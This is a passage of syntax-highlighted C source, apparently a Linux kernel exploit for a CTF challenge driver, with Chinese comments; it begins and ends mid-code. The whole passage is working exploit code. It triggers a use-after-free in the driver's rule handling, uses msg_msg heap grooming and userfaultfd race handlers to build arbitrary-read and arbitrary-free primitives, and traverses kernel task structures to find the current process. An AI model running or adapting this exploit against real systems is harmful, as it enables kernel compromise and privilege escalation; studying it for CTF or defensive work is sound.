</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">sleep</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[PFH 2] Releasing faulting thread</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">            ufd_copy.</span><span style="color:#bf616a;">dst </span><span style="color:#c0c5ce;">= (</span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;">)(page_fault_location);
</span><span style="color:#c0c5ce;">            ufd_copy.</span><span style="color:#bf616a;">src </span><span style="color:#c0c5ce;">= (</span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;">)(&amp;buff2);
</span><span style="color:#c0c5ce;">            ufd_copy.</span><span style="color:#bf616a;">len </span><span style="color:#c0c5ce;">= PAGE_SIZE;
</span><span style="color:#c0c5ce;">            ufd_copy.</span><span style="color:#bf616a;">mode </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">            ufd_copy.</span><span style="color:#bf616a;">copy </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">ioctl</span><span style="color:#c0c5ce;">(ufd, UFFDIO_COPY, &amp;ufd_copy) &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">            {
</span><span style="color:#c0c5ce;">                </span><span style="color:#96b5b4;">perror</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">ioctl(UFFDIO_COPY)</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">                </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">            }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[PFH 2] Faulting thread released</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">uint64_t *</span><span style="color:#8fa1b3;">arb_read</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">idx</span><span style="color:#c0c5ce;">, uint64_t </span><span style="color:#bf616a;">target</span><span style="color:#c0c5ce;">, size_t </span><span style="color:#bf616a;">size</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">overwrite</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> evil_msg *msg = (</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> evil_msg *)</span><span style="color:#96b5b4;">malloc</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x100</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    msg-&gt;m_type =  </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    msg-&gt;m_ts = size;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(overwrite)
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        msg-&gt;next = target;
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">edit_rule</span><span style="color:#c0c5ce;">(idx, (</span><span style="color:#b48ead;">unsigned char </span><span style="color:#c0c5ce;">*)msg, OUTBOUND, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">else
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">edit_rule</span><span style="color:#c0c5ce;">(idx, (</span><span style="color:#b48ead;">unsigned char </span><span style="color:#c0c5ce;">*)msg, OUTBOUND, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">free</span><span style="color:#c0c5ce;">(msg);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">recv_msg</span><span style="color:#c0c5ce;">(qid[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">], size);
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">arb_free</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">idx</span><span style="color:#c0c5ce;">, uint64_t </span><span style="color:#bf616a;">target</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> evil_msg *msg = (</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> evil_msg *)</span><span style="color:#96b5b4;">malloc</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x100</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*memdump = </span><span style="color:#96b5b4;">malloc</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x2000</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    msg-&gt;m_list.</span><span style="color:#bf616a;">next </span><span style="color:#c0c5ce;">= queue;
</span><span style="color:#c0c5ce;">    msg-&gt;m_list.</span><span style="color:#bf616a;">prev </span><span style="color:#c0c5ce;">= queue;
</span><span style="color:#c0c5ce;">    msg-&gt;m_type =  </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    msg-&gt;m_ts = </span><span style="color:#d08770;">0x10</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    msg-&gt;next = target;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">edit_rule</span><span style="color:#c0c5ce;">(idx, (</span><span style="color:#b48ead;">unsigned char </span><span style="color:#c0c5ce;">*)msg, OUTBOUND, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[*] Triggering arb free...</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">msgrcv</span><span style="color:#c0c5ce;">(qid[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">], memdump, </span><span style="color:#d08770;">0x10</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, IPC_NOWAIT | MSG_NOERROR);
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] Target freed!</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">free</span><span style="color:#c0c5ce;">(memdump);
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">free</span><span style="color:#c0c5ce;">(msg);
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">uint64_t </span><span style="color:#8fa1b3;">find_current_task</span><span style="color:#c0c5ce;">(uint64_t </span><span style="color:#bf616a;">init_task</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    pid_t pid, next_task_pid;
</span><span style="color:#c0c5ce;">    uint64_t next_task;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    pid = </span><span style="color:#8fa1b3;">getpid</span><span style="color:#c0c5ce;">();
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] Current task PID: </span><span style="color:#d08770;">%d</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, pid);
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[*] Traversing tasks...</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">// 跳过第一块msg，索引到next指向的值
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">// 这里+0x1f9实际上是留了8字节给前面+8跳过的8字节，从而偏移不变
</span><span style="color:#c0c5ce;">    leak = </span><span style="color:#8fa1b3;">arb_read</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, init_task + </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x1500</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">) + </span><span style="color:#d08770;">0x1f9</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    next_task = leak[</span><span style="color:#d08770;">0x298</span><span style="color:#c0c5ce;">/</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">] - </span><span style="color:#d08770;">0x298</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    leak = </span><span style="color:#8fa1b3;">arb_read</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, next_task + </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x1500</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">) + </span><span style="color:#d08770;">0x1f9</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    next_task_pid = leak[</span><span style="color:#d08770;">0x398</span><span style="color:#c0c5ce;">/</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">];
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">while </span><span style="color:#c0c5ce;">(next_task_pid != pid)
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        next_task = leak[</span><span style="color:#d08770;">0x298</span><span style="color:#c0c5ce;">/</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">] - </span><span style="color:#d08770;">0x298</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        leak = </span><span style="color:#8fa1b3;">arb_read</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, next_task + </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x1500</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">) + </span><span style="color:#d08770;">0x1f9</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        next_task_pid = leak[</span><span style="color:#d08770;">0x398</span><span style="color:#c0c5ce;">/</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">];
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] Current task found!</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> next_task;
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*</span><span style="color:#8fa1b3;">allocate_msg1</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">_</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[Thread 1] Message buffer allocated at 0x</span><span style="color:#d08770;">%lx</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, page_1 + PAGE_SIZE - </span><span style="color:#d08770;">0x10</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">((qid[</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">] = </span><span style="color:#8fa1b3;">msgget</span><span style="color:#c0c5ce;">(IPC_PRIVATE, </span><span style="color:#d08770;">0666 </span><span style="color:#c0c5ce;">| IPC_CREAT)) == -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">perror</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">msgget</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(page_1, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, PAGE_SIZE);
</span><span style="color:#c0c5ce;">    ((</span><span style="color:#b48ead;">unsigned long </span><span style="color:#c0c5ce;">*)(page_1))[</span><span style="color:#d08770;">0xff0 </span><span style="color:#c0c5ce;">/ </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">] = </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">msgsnd</span><span style="color:#c0c5ce;">(qid[</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">], page_1 + PAGE_SIZE - </span><span style="color:#d08770;">0x10</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x1ff8 </span><span style="color:#c0c5ce;">- </span><span style="color:#d08770;">0x30</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">msgsend failed!</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">perror</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">msgsnd</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[Thread 1] Message sent, *next overwritten!</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*</span><span style="color:#8fa1b3;">allocate_msg2</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">_</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[Thread 2] Message buffer allocated at 0x</span><span style="color:#d08770;">%lx</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, page_2 + PAGE_SIZE - </span><span style="color:#d08770;">0x10</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">((qid[</span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">] = </span><span style="color:#8fa1b3;">msgget</span><span style="color:#c0c5ce;">(IPC_PRIVATE, </span><span style="color:#d08770;">0666 </span><span style="color:#c0c5ce;">| IPC_CREAT)) == -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">perror</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">msgget</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(page_2, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, PAGE_SIZE);
</span><span style="color:#c0c5ce;">    ((</span><span style="color:#b48ead;">unsigned long </span><span style="color:#c0c5ce;">*)(page_2))[</span><span style="color:#d08770;">0xff0 </span><span style="color:#c0c5ce;">/ </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">] = </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">msgsnd</span><span style="color:#c0c5ce;">(qid[</span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">], page_2 + PAGE_SIZE - </span><span style="color:#d08770;">0x10</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x1028 </span><span style="color:#c0c5ce;">- </span><span style="color:#d08770;">0x30</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">msgsend failed!</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">perror</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">msgsnd</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[Thread 2] Message sent, target overwritten!</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">main</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">void</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    pthread_t tid[</span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">];
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    fd = </span><span style="color:#8fa1b3;">open</span><span style="color:#c0c5ce;">(DEVICE_PATH, O_RDONLY);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[*] Mmapping pages...</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    page_1 = </span><span style="color:#8fa1b3;">mmap</span><span style="color:#c0c5ce;">((</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*)</span><span style="color:#d08770;">0xdead000</span><span style="color:#c0c5ce;">, PAGE_SIZE*</span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE, -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    page_2 = </span><span style="color:#8fa1b3;">mmap</span><span style="color:#c0c5ce;">((</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*)</span><span style="color:#d08770;">0xcafe000</span><span style="color:#c0c5ce;">, PAGE_SIZE*</span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE, -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> ufd_1 = </span><span style="color:#8fa1b3;">initialize_ufd</span><span style="color:#c0c5ce;">(page_1);
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> ufd_2 = </span><span style="color:#8fa1b3;">initialize_ufd</span><span style="color:#c0c5ce;">(page_2);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">pthread_create</span><span style="color:#c0c5ce;">(&amp;tid[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">], </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">, page_fault_handler_1, &amp;ufd_1);
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">pthread_create</span><span style="color:#c0c5ce;">(&amp;tid[</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">], </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">, page_fault_handler_2, &amp;ufd_2);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">// 创建两个消息队列
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">((qid[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">] = </span><span style="color:#8fa1b3;">msgget</span><span style="color:#c0c5ce;">(IPC_PRIVATE, </span><span style="color:#d08770;">0666 </span><span style="color:#c0c5ce;">| IPC_CREAT)) == -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">perror</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">msgget</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">((qid[</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">] = </span><span style="color:#8fa1b3;">msgget</span><span style="color:#c0c5ce;">(IPC_PRIVATE, </span><span style="color:#d08770;">0666 </span><span style="color:#c0c5ce;">| IPC_CREAT)) == -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">perror</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">msgget</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(buff, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, PAGE_SIZE);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">// 触发UAF
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">add_rule</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, buff, INBOUND);
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">duplicate_rule</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, INBOUND);
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">delete_rule</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, INBOUND);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">// 拿回UAF的0x40空间
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">send_msg</span><span style="color:#c0c5ce;">(qid[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">], </span><span style="color:#d08770;">0x40</span><span style="color:#c0c5ce;">, &#39;</span><span style="color:#a3be8c;">C</span><span style="color:#c0c5ce;">&#39;);
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">send_msg</span><span style="color:#c0c5ce;">(qid[</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">], </span><span style="color:#d08770;">0x40</span><span style="color:#c0c5ce;">, &#39;</span><span style="color:#a3be8c;">B</span><span style="color:#c0c5ce;">&#39;);
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">send_msg</span><span style="color:#c0c5ce;">(qid[</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">], </span><span style="color:#d08770;">0x1ff8</span><span style="color:#c0c5ce;">, &#39;</span><span style="color:#a3be8c;">A</span><span style="color:#c0c5ce;">&#39;);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[*] Allocating messages...</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    uint64_t *leak = </span><span style="color:#8fa1b3;">arb_read</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x2000</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[*] Looking for pointers...</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    uint64_t init_task = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> i = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; i &lt; </span><span style="color:#d08770;">0x400</span><span style="color:#c0c5ce;">; i++)
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">((leak[i] &amp; </span><span style="color:#d08770;">0xffff</span><span style="color:#c0c5ce;">) == </span><span style="color:#d08770;">0x4242 </span><span style="color:#c0c5ce;">&amp;&amp; !large_msg)
</span><span style="color:#c0c5ce;">        {
</span><span style="color:#c0c5ce;">            large_msg = leak[i - </span><span style="color:#d08770;">6</span><span style="color:#c0c5ce;">];
